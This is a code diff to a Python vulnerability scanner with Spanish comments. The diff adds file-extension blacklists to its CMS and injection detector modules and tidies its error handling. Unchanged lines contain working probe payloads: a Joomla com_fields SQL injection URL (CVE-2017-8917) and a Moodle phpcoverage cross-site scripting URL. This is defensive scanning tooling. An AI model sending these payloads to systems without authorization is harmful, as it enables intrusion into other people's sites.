@@ -16,11 +16,12 @@ El metodo que verifica la vulnerabilidad es launchExploitsF
 cada modulo debe definir su comportamiento en este metodo
 """
 class vulndetector(object):
-	def __init__(self,req=None,color=False):
+	def __init__(self,req=None,blacklist=[],color=False):
 		try:
 			init(convert=True,autoreset=True) # colorama
 		except:
 			pass
+		self.blacklist = blacklist
 		self.color = False
 		self.name = 'vulndetector'
 		# Elementos para explotar
@@ -62,7 +63,8 @@ class vulndetector(object):
 	
 	# Detecta mediante la url (nombre del archivo)
 	def fromFilename(self,filename):
-		if self.standalone:
+		#if self.standalone:
+		if self.standalone and parseurls.get_extension(filename) not in self.blacklist:
 			print 'Running exploit from filename module ',self.name
 			self.launchExploitFilename(filename)
 	
@@ -109,9 +111,10 @@ class vulndetector(object):
 	
 # done
 class strutscan(vulndetector):
-	def __init__(self,req,color=False):
+	def __init__(self,req,blacklist,color=False):
 		self.name = 'struts'
 		self.color = color
+		self.blacklist = blacklist
 		self.req = req
 		self.cmsroot = None
 		self.toolflags = []
@@ -133,9 +136,10 @@ class strutscan(vulndetector):
 		self.standalone = True
 
 	def launchExploitFilename(self,dirurl):
-		if self.launchExploitCVE_2013_2251(dirurl):
-			cve = 'CVE2013-2251'
-			print '*'*(len(cve)+15),'\nVulnerable to %s\n' % cve,'*'*(len(cve)+15)
+		if parseurls.get_extension(dirurl) not in self.blacklist:
+			if self.launchExploitCVE_2013_2251(dirurl):
+				cve = 'CVE2013-2251'
+				print '*'*(len(cve)+15),'\nVulnerable to %s\n' % cve,'*'*(len(cve)+15)	
 			#print "VULNERABLE TO CVE2013-2251: ",dirurl
 		
 	def launchExploitCVE_2013_2251(self,dirurl):
@@ -162,23 +166,24 @@ class strutscan(vulndetector):
 		tocheck = 'TRUERANDOM'
 		fullurl = dirurl+payload
 		print 'testing %s' % fullurl
-		response = self.req.getHTMLCode(fullurl)
 		try:
+			response = self.req.getHTMLCode(fullurl)
 			if tocheck in response.text:
 				#self.detections.append("[ "+fullurl+" ] ====== "+cve)
 				self.detections.append("[ "+fullurl+" ] ====== VULNERABLE TO: "+cve+" =====")
 				return True
 			return False
 		except Exception as e:
-			print 'excepcion cachada '+str(e)
+			print 'struts excepcion cachada '+str(e)
 			return False
 			
 class drupalscan(vulndetector):
-	def __init__(self,req,color=False):
+	def __init__(self,req,blacklist,color=False):
 		#print 'Entre a drupalscan vuln'
 		self.name = 'drupal'
 		self.color = color
 		self.req = req
+		self.blacklist = blacklist
 		self.cmsroot = None
 		self.toolflags = []
 		self.headers = []
@@ -216,9 +221,9 @@ class drupalscan(vulndetector):
 		#print 'debug dirurl',dirurl
 		#print 'trying xmlrpc'
 		#print ' dirurl ',dirurl
-		response = self.req.getHTMLCode(dirurl)
 		tocheck = 'XML-RPC'
 		try:
+			response = self.req.getHTMLCode(dirurl)
 			if response is not None and tocheck in response.text:
 				print '*'*30,'\nVulnerable to %s\n' % cve,'*'*30
 				self.detections.append("[ "+dirurl+" ] ====== VULNERABLE TO: "+cve+" ========")
@@ -248,10 +253,11 @@ class drupalscan(vulndetector):
 			return False
 			
 class wordpresscan(vulndetector):
-	def __init__(self,req,color=False):
+	def __init__(self,req,blacklist,color=False):
 		self.name = 'wordpress'
 		self.color = color
 		self.req = req
+		self.blacklist = blacklist
 		self.cmsroot = None
 		self.toolflags = []
 		self.headers = []
@@ -277,6 +283,7 @@ class wordpresscan(vulndetector):
 		if self.cmsroot is not None:
 			self.launchXMLRPC()
 			self.SimpleSocialButtons()
+			
 	def launchXMLRPC(self):
 		#print 'WORDPRESS VULN trying xmlrpc'
 		cve = 'xmlrpc methods exposed'
@@ -334,10 +341,11 @@ class wordpresscan(vulndetector):
 				return False
 			
 class joomlascan(vulndetector):
-	def __init__(self,req,color=False):
+	def __init__(self,req,blacklist,color=False):
 		self.name = 'joomla'
 		self.color = color
 		self.req = req
+		self.blacklist = blacklist
 		self.cmsroot = None
 		self.toolflags = []
 		self.headers = []
@@ -368,9 +376,9 @@ class joomlascan(vulndetector):
 		cve = 'Joomla com_fields SQL Injection (CVE-2017-8917)'
 		fullurl = self.cmsroot+'/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x23,concat(1,truerandomtruerandom),1)'
 		#print "fullurl ",fullurl
-		response = self.req.getHTMLCode(fullurl)
 		tocheck = 'truerandomtruerandom'
 		try:
+			response = self.req.getHTMLCode(fullurl)
 			if tocheck in response.text:
 				print '*'*(len(cve)+15),'\nVulnerable to %s\n' % cve,'*'*(len(cve)+15)
 				res = ''
@@ -387,10 +395,11 @@ class joomlascan(vulndetector):
 			return False
 
 class moodlescan(vulndetector):
-	def __init__(self,req,color=False):
+	def __init__(self,req,blacklist,color=False):
 		self.name = 'moodle'
 		self.color = color
 		self.req = req
+		self.blacklist = blacklist
 		self.cmsroot = None
 		self.toolflags = []
 		self.headers = []
@@ -421,9 +430,9 @@ class moodlescan(vulndetector):
 		cve = 'PHPCOVERAGE_HOME Cross Site Scripting'
 		fullurl = self.cmsroot+'/lib/spikephpcoverage/src/phpcoverage.remote.top.inc.php?PHPCOVERAGE_HOME=%3Cscript%3Ealert(%22truerandom%22)%3C/script%3E'
 		#print "fullurl ",fullurl
-		response = self.req.getHTMLCode(fullurl)
 		tocheck = '<script>alert("truerandom")</script>'
 		try:
+			response = self.req.getHTMLCode(fullurl)
 			if tocheck in response.text:
 				print '*'*(len(cve)+15),'\nVulnerable to %s\n' % cve,'*'*(len(cve)+15)
 				self.detections.append("[ "+fullurl+" ] ====== VULNERABLE TO: "+cve+" =====")
@@ -434,10 +443,11 @@ class moodlescan(vulndetector):
 			return False
 			
 class magentoscan(vulndetector):
-	def __init__(self,req,color=False):
+	def __init__(self,req,blacklist,color=False):
 		self.name = 'magento'
 		self.color = color
 		self.req = req
+		self.blacklist = blacklist
 		self.cmsroot = None
 		self.toolflags = []
 		self.headers = []
@@ -491,10 +501,11 @@ class magentoscan(vulndetector):
 			return False
 			
 class xssscan(vulndetector):
-	def __init__(self,req,color=False):
+	def __init__(self,req,blacklist,color=False):
 		self.name = 'xssscan'
 		self.color = color
 		self.req = req
+		self.blacklist = blacklist
 		self.cmsroot = None
 		self.toolflags = []
 		self.headers = []
@@ -517,8 +528,9 @@ class xssscan(vulndetector):
 		self.already_tested = {} 
 		
 	def launchExploitFilename(self,dirurl):
-		if self.testXSS(dirurl):
-			print "VULNERABLE TO XSS: ",dirurl
+		if parseurls.get_extension(dirurl) not in self.blacklist:
+			if self.testXSS(dirurl):
+				print "VULNERABLE TO XSS: ",dirurl
 	
 	def testXSS(self,dirurl):
 		print('DEBUG: xss: already tested: ')
@@ -549,7 +561,7 @@ class xssscan(vulndetector):
 				try:
 					res = self.req.getHTMLCode(full_url)
 				except Exception as e:
-					pass
+					print('problem at vuln_detection %s' % full_url)
 				if res is not None and res.text is not None:
 					if tocheck in res.text:
 						print '*'*(len(cve)+15),'\nVulnerable to %s\n' % cve,'*'*(len(cve)+15)
@@ -563,10 +575,11 @@ class xssscan(vulndetector):
 		return False					
 					
 class sqliscan(vulndetector):
-	def __init__(self,req,color=False):
+	def __init__(self,req,blacklist,color=False):
 		self.name = 'sqliscan'
 		self.color = color
 		self.req = req
+		self.blacklist = blacklist
 		self.cmsroot = None
 		self.toolflags = []
 		self.headers = []
@@ -596,8 +609,9 @@ class sqliscan(vulndetector):
 		self.already_tested_union_sqli = {}
 		
 	def launchExploitFilename(self,dirurl):
-		if self.testSQLi(dirurl):
-			print "VULNERABLE TO SQLi: ",dirurl
+		if parseurls.get_extension(dirurl) not in self.blacklist:
+			if self.testSQLi(dirurl):
+				print "VULNERABLE TO SQLi: ",dirurl
 		
 	def testSQLi(self,dirurl):
 		self.error_based_sqli(dirurl)
@@ -784,10 +798,11 @@ class sqliscan(vulndetector):
 		return False
 
 class path_traversal_scan(vulndetector):
-	def __init__(self,req,color=False):
+	def __init__(self,req,blacklist,color=False):
 		self.name = 'path_traversal_scan'
 		self.color = color
 		self.req = req
+		self.blacklist = blacklist
 		self.cmsroot = None
 		self.toolflags = []
 		self.headers = []
@@ -824,8 +839,9 @@ class path_traversal_scan(vulndetector):
 		
 	def launchExploitFilename(self,dirurl):
 		#print('DEBUG: path_traversal ',dirurl)
-		if self.test_traversal(dirurl):
-			print "VULNERABLE TO PATH TRAVERSAL: ",dirurl
+		if parseurls.get_extension(dirurl) not in self.blacklist:
+			if self.test_traversal(dirurl):
+				print "VULNERABLE TO PATH TRAVERSAL: ",dirurl
 	
 	def test_traversal(self,dirurl):
 		print('DEBUG:path_traversal: already tested: ')
